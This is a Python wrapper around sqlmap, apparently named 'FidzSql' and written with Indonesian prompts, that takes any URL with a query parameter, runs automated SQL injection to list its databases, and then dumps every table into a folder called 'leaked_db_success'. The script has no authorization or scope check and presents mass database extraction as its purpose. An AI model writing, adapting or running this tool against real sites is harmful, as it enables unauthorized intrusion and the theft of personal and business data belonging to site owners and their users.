import subprocess
import os
import re
import shutil
from colorama import init, Fore, Style
from datetime import datetime

init(autoreset=True)

SQLMAP_PATH = "sqlmap.py"
LOG_FILE = "sqli_tool_log.txt"
DUMP_FOLDER = "leaked_db_success"

IMPORTANT_PATTERNS = {
    "payload": re.compile(r"(?i)payload: (.+)"),
    "parameter": re.compile(r"(?i)parameter:\s*(\w+)"),
    "type": re.compile(r"(?i)type:\s*(.+)"),
    "title": re.compile(r"(?i)title:\s*(.+)"),
    "dbms": re.compile(r"(?i)the back-end DBMS is (.+)"),
    "tech": re.compile(r"(?i)(web application technology.*)")
}

DB_ENTRY_RETRIEVED = re.compile(r"\[INFO\].*retrieved:\s*([a-zA-Z0-9_]+)")
DB_ENTRY_LISTED = re.compile(r"\[\*\]\s*([a-zA-Z0-9_]+)")

ASCII_PATTERNS = [
    re.compile(r"^\s*__H__\s*$"),
    re.compile(r"^\s*___ ___\[\(]_____ ___ ___.*$"),
    re.compile(r"^\s*\|_ -\|.*"),
    re.compile(r"^\s*\|___\|.*"),
    re.compile(r"^\s*\|_\|.*https?://sqlmap\.org.*")
]

def timestamp():
    return datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")

def fidz_tag():
    return f"{Fore.LIGHTGREEN_EX}[FidzSql]{Style.RESET_ALL}"

def fidz_print(msg, color=Fore.MAGENTA):
    print(f"{timestamp()} {fidz_tag()} {color}{msg}{Style.RESET_ALL}")

def get_target_url():
    prompt = f"{Fore.LIGHTYELLOW_EX}{Style.BRIGHT}[?] Masukkan URL target lengkap (contoh: http://site.com/page.php?id=1):{Style.RESET_ALL}"
    while True:
        print(prompt)
        url = input("> ").strip()
        if '=' in url:
            return url
        print(f"{Fore.RED}[!] URL harus memiliki parameter (?id=...)")

def should_skip_line(line):
    for pattern in ASCII_PATTERNS:
        if pattern.match(line.strip()):
            return True
    return False

def run_sqlmap_filtered(args, log_file):
    cmd = ["python3", SQLMAP_PATH] + args
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
    db_names = []
    capture = False

    for line in proc.stdout:
        raw = line.strip()
        if should_skip_line(raw):
            continue

        log_file.write(line)

        if "available databases" in raw.lower():
            capture = True
            continue

        if capture:
            for pattern in [DB_ENTRY_RETRIEVED, DB_ENTRY_LISTED]:
                match = pattern.search(raw)
                if match:
                    db = match.group(1)
                    if db and db not in db_names:
                        db_names.append(db)
                        color = Fore.LIGHTGREEN_EX if db.lower() != "information_schema" else Fore.MAGENTA
                        fidz_print(f"Database: {db}", color)

        for key, pattern in IMPORTANT_PATTERNS.items():
            match = pattern.search(raw)
            if match:
                val = match.group(1)
                if key == "payload":
                    fidz_print(f"Payload: {val}")
                elif key == "parameter":
                    fidz_print(f"Parameter: {val}")
                elif key == "type":
                    fidz_print(f"Tipe: {val}")
                elif key == "title":
                    fidz_print(f"Judul: {val}")
                elif key == "dbms":
                    fidz_print(f"DBMS: {val}")
                elif key == "tech":
                    fidz_print(val)

    proc.wait()
    return db_names

def run_sqlmap_dump_all(args, log_file):
    cmd = ["python3", SQLMAP_PATH] + args
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)

    for line in proc.stdout:
        raw = line.strip()
        if should_skip_line(raw):
            continue

        log_file.write(line)
        print(f"{timestamp()} {fidz_tag()} {Fore.MAGENTA}{raw}{Style.RESET_ALL}")

    proc.wait()

def extract_dumps(save_to):
    for root, _, files in os.walk("sqlmap_output"):
        for file in files:
            if file.endswith(".csv") or file.endswith(".txt"):
                table = os.path.splitext(file)[0]
                db = os.path.basename(root)
                src = os.path.join(root, file)
                dst = os.path.join(save_to, f"{db}__{table}.txt")
                shutil.copy(src, dst)
                fidz_print(f"\U0001F4C5 Dump tabel {table} dari DB {db} disimpan di: {dst}", Fore.CYAN)

def scan_target(target_url):
    os.makedirs(DUMP_FOLDER, exist_ok=True)
    session_log_name = f"log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    session_log_path = os.path.join(DUMP_FOLDER, session_log_name)

    with open(LOG_FILE, "a") as main_log, open(session_log_path, "w") as session_log:
        fidz_print(f"\U0001F680 Scanning target: {target_url}", Fore.CYAN)
        dbs = run_sqlmap_filtered(["-u", target_url, "--batch", "--dbs"], session_log)

        if not dbs:
            fidz_print("❌ Tidak ada database ditemukan!", Fore.RED)
            return

        for db in dbs:
            if db.lower() == "information_schema":
                continue
            fidz_print(f"\U0001F9C3 Melakukan dump pada database: {db} ...", Fore.YELLOW)
            run_sqlmap_dump_all(["-u", target_url, "--batch", "-D", db, "--dump-all", "--output-dir=sqlmap_output"], session_log)

        extract_dumps(DUMP_FOLDER)
        fidz_print(f"✅ Semua dump selesai. Cek folder: {DUMP_FOLDER}", Fore.GREEN)

        with open(session_log_path) as f:
            main_log.write(f.read())

if __name__ == "__main__":
    url = get_target_url()
    scan_target(url)
